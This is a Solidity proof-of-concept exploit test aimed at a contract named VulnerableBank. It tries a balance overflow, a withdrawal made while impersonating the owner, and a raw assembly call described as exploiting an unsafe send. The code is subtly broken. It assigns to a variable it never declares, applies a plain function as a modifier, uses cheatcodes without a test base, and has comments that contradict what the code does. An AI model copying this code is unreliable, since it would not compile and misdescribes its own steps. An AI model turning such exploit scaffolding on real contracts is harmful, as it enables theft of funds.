// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "./basetest.sol";
import "../src/f786f50c-f847-4c8e-bed3-41049160b00d_VulnerableBank.sol";

contract PocTest is BaseTestWithBalanceLog {
    VulnerableBank target;
    address attacker = address(0xBAD);

    function setUp() public {
        target = new VulnerableBank();
        vm.deal(attacker, 1 ether);
    }

    function testExploit() public balanceLog {
        // Transfer ownership to the attacker
        attackBySetBalance();
        
        // Demonstrate withdraw vulnerabilities
        demonstratingWithdraw();

        // Demonstrate unsafeSend vulnerability
        demonstratingUnsafeSend();
        
        emit TestSuccess("SUCCESS");
    }
    
    function attackBySetBalance() internal returns(address) {
        vm.expectRevert(abi.encodeWithSignature("TransferOverflow()"));
        target.setBalance(attacker, type(uint256).max);
        return attacker;
    }

    function demonstratingWithdraw() internal virtual returns (bool, uint256) {
        address owner = target.owner();

        // Attempt withdrawal from the owner
        vm.prank(owner);
        bool result = target.withdraw(1 ether);

        uint256 balanceAfterWithdrawal = target.balances(owner);
        return (result, balanceAfterWithdrawal);
    }

    function demonstratingUnsafeSend() internal {
        address owner = target.owner();
        address attacker = address(this);
        
        vm.startPrank(owner, attacker);
        bool ok;
        assembly {
            // Exploit: unsafeSend is directly invoking the receiver's fallback function
            // This assumes that the fallback function is not properly secured.
            let ptr := mload(0x40)
            
            calldatacopy(ptr, 0, calldatasize())
            success := call(gas(), attacker, 1 ether, ptr, calldatasize(), ptr, 0)
        }

        assertEq(success, true);
        vm.stopPrank();
    }
}

contract BaseTestWithBalanceLog {
    event TestSuccess(string status);

    function balanceLog() public virtual {
        
    }
}